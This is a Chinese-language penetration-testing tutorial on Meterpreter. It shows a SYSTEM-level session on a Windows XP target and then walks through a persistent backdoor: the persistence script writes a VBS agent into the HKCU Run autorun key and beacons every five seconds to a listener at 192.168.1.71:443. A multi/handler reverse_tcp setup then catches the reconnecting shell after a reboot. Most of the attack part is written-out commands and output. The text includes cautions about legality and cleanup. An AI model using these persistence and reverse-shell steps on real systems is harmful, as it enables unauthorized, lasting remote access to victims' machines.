## Meterpreter 会话示例与后门设置

### 示例 Meterpreter 会话
在以下会话中，我们展示了一个典型的 Meterpreter 交互过程。请注意，在使用这些技术时需格外小心，以避免违反法律法规或道德规范。

```
972   TPAutoConnSvc.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnSvc.exe
1000  Explorer.exe       C:\WINNT\Explorer.exe                                 
1088  TPAutoConnect.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe
meterpreter > pwd
C:\WINDOWS\system32
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```

### Meterpreter 服务介绍

#### 了解 Metasploit Meterpreter

渗透系统之后，为了确保后续可以再次访问该系统（即使最初的漏洞被修复），通常需要创建一个持久性的后门。Metasploit 提供了 `persistence.rb` 脚本来实现这一功能，但请记住，这样的后门不需要认证，这意味着任何连接到它的人都能进入系统。因此，在实际操作中，请务必谨慎行事，并在任务完成后清理痕迹。

查看可用选项的方法如下：

```
meterpreter > run persistence -h
[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
Meterpreter Script for creating a persistent backdoor on a target host.
OPTIONS:
    -A        Automatically start a matching exploit/multi/handler to connect to the agent
    -L   Location in target host to write payload to, if none %TEMP% will be used.
    -P   Payload to use, default is windows/meterpreter/reverse_tcp.
    -S        Automatically start the agent on boot as a service (with SYSTEM privileges)
    -T   Alternate executable template to use
    -U        Automatically start the agent when the User logs on
    -X        Automatically start the agent when the system boots
    -h        This help menu
    -i   The interval in seconds between each connection attempt
    -p   The port on which the system running Metasploit is listening
    -r   The IP of the system running Metasploit listening for the connect back
```

### 设置持续性 Meterpreter 会话

我们将配置一个持续性的 Meterpreter 会话，当用户登录远程系统时，它将每隔5秒尝试连接到 IP 地址为 192.168.1.71 的监听器的443端口。

```
meterpreter > run persistence -U -i 5 -p 443 -r 192.168.1.71
[*] Creating a persistent agent: LHOST=192.168.1.71 LPORT=443 (interval=5 onboot=true)
[*] Persistent agent script is 613976 bytes long
[*] Uploaded the persistent agent to C:\WINDOWS\TEMP\yyPSPPEn.vbs
[*] Agent executed with PID 492
[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\YeYHdlEDygViABr
[*] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\YeYHdlEDygViABr
[*] For cleanup use command: run multi_console_command -rc /root/.msf4/logs/persistence/XEN-XP-SP2-BARE_20100821.2602/clean_up__20100821.2602.rc
```

请注意，脚本输出提供了完成时删除持久侦听器的命令。请记下此命令，以便稍后清除后门。

### 验证持久性设置

重启远程系统并设置相应的payload程序来验证是否成功设置了持久性后门。

```
meterpreter > reboot
Rebooting...
meterpreter > exit
[*] Meterpreter session 3 closed.  Reason: User exit
msf exploit(ms08_067_netapi) > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.1.71
LHOST => 192.168.1.71
msf exploit(handler) > set LPORT 443
LPORT => 443
msf exploit(handler) > exploit
[*] Started reverse handler on 192.168.1.71:443
[*] Starting the payload handler...
[*] Sending stage (748544 bytes) to 192.168.1.161
[*] Meterpreter session 5 opened (192.168.1.71:443 -> 192.168.1.161:1045) at 2010-08-21 12:31:42 -0600
meterpreter > sysinfo
Computer: XEN-XP-SP2-BARE
OS      : Windows XP (Build 2600, Service Pack 2).
Arch    : x86
Language: en_US
```

### 结论

保持对目标系统的访问权限是一项具有特定目的的任务，旨在允许测试者长期驻留在目标系统中，直到获取所需信息。然而，这在实践中可能非常复杂且充满挑战。就像在未经许可的情况下长时间逗留他人住所一样，尽管在网络世界里这种行为相对容易一些，但仍存在许多障碍。

### 参考文献

- blog.globalknowledge.com（2011）。黑客攻击的5个阶段：维护访问。
- Bull, D.（2016）。数据泄露，第4部分：数据如何离开你的四面墙？
- Buskirk, P.（2015）。先进的方法来检测先进的网络攻击：HTTP(S)Exfiltration。
- DaBoss（2013）。隐形病毒和Rootkit。
- FixMeStick（2015）。病毒实验室 - 什么是Rootkit？
- gadgetreview.com（2015）。什么是Rootkit及其为什么是危险的？
- 卡巴斯基。Rootkit是如何工作的。
- 主。N.（2015）。什么是数据泄露？
- Lewis, N.（2011）。检测隐蔽通道，防止企业数据泄露。
- McAfee（2015）。停止数据泄露。
- 占领网站（2015年）。如何用Tunnelshell创建几乎不可察觉的隐蔽通道。
- 史密斯, T.（2015年）。通过朦胧透视 - 检测攻击者窃取您的数据的策略。
- splunk.com（2014）。检测并停止数据泄露。
- 趋势科技（2013）。数据泄露：威胁行为者如何窃取您的数据？
- 阶段4 - 维护访问。
- 演讲主题上：“CIS 450 -网络安全第15章-保留访问” -演讲全文。
- 什么是一个rootkit。